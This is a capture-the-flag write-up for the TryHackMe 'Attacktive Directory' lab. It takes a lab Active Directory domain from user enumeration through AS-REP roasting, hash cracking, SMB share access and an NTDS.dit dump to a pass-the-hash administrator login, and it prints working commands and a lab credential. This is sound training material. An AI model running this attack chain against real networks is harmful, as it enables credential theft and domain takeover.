# Write-up: [Attacktive Directory — Enumeration & Exploitatio](https://tryhackme.com/room/attacktivedirectory)

This write-up covers the process of enumerating and exploiting an Active Directory (AD) environment using various tools such as enum4linux, kerbrute, GetNPUsers.py, john, and secretsdump.py. The objective is to extract credentials and escalate privileges to domain admin access.

## Enumeration Phase
What tool will allow us to enumerate port 139/445? ```enum4linux```

Run the following:

```python
enum4linux 10.10.57.254
```
We discover key details:

```python
Domain Name: THM-AD  
Domain SID: S-1-5-21-3591857110-2884097990-301047963  
[+] Host is part of a domain (not a workgroup)
```
What invalid TLD do people commonly use for their Active Directory Domain? ```.local```

Now we enumerate usernames using Kerbrute.

Give execution permission to the binary:

```python
chmod +x kerbrute_linux_amd64
```
Run a user enumeration scan:

```python
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.57.254 usernames.txt
```
Discovered users:

```python
svc-admin@spookysec.local  
backup@spookysec.local  
administrator@spookysec.local  
JAMES@spookysec.local  
Robin@spookysec.local  
Administrator@spookysec.local  
Darkstar@spookysec.local  
Paradox@spookysec.local  
DARKSTAR@spookysec.local  
ori@spookysec.local  
ROBIN@spookysec.local  
```
## Exploitation Phase

After collecting valid usernames, we attempt an AS-REP Roasting attack — a Kerberos vulnerability affecting accounts with the setting "Does not require Pre-Authentication".

We use ```GetNPUsers.py``` from Impacket to retrieve roastable accounts.

```python
PYTHONPATH=.. python3 GetNPUsers.py spookysec.local/ -usersfile /home/kali/Downloads/users.txt -dc-ip 10.10.57.254 -no-pass
```
We successfully retrieve:

```python
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:da04bdcdd500c358...
```
Identify hash type:

```python
Hashcat Mode: 18200 - Kerberos 5, etype 23, AS-REP
```
Save it to ```hash.txt``` and crack with ```john```:

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
## SMB Enumeration

Use ```smbclient``` to access shares with cracked credentials:

```python
smbclient -L 10.10.57.254 -U svc-admin
```
Found shares:

```python
ADMIN$  
backup  
C$  
IPC$  
NETLOGON  
SYSVOL
```
Connect to the backup share:

```python
smbclient \\\\10.10.57.254\\backup -U svc-admin
```
Locate and retrieve:

```python
backup_credentials.txt
```
Base64-decode the contents to reveal further credentials.

## NTDS.dit Dump

What method allowed us to dump the NTDS.dit file? ```DRSUAPI```

Use Impacket's ```secretsdump.py``` to extract all NTLM password hashes:

```python
python secretsdump.py spookysec.local/backup:backup2517860@10.10.57.254
```
Obtain the Administrator hash, then log in via ```evil-winrm```:

```python
evil-winrm -i 10.10.57.254 -u Administrator -H 0e036...0bcb4fc
```
## Conclusion

Through systematic enumeration and exploitation using tools like Kerbrute, GetNPUsers, John, and Impacket’s secretsdump, we escalated from user access to full domain admin privileges in an Active Directory environment.


